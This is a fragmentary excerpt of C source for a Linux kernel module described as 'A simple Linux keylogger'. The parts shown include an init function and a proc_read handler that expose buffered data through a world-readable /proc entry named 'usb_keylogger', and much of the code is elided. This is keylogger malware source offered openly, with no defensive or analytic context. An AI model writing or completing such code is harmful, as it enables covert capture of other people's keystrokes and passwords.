...
static ssize_t proc_read(struct file *file, char __user *user_buffer, size_t count, loff_t *ppos) {
    ...
    *ppos += buffer_pos; // Update the file position
    int bytes_read = buffer_pos;
    buffer_pos = 0;
    data_available = 0;
    return bytes_read;
...
static int __init keylogger_init(void) {
    ...
    // Create /proc entry
    proc_entry = proc_create("usb_keylogger", 0444, NULL, &proc_fops);
    if (!proc_entry) {
...
MODULE_DESCRIPTION("A simple Linux keylogger");
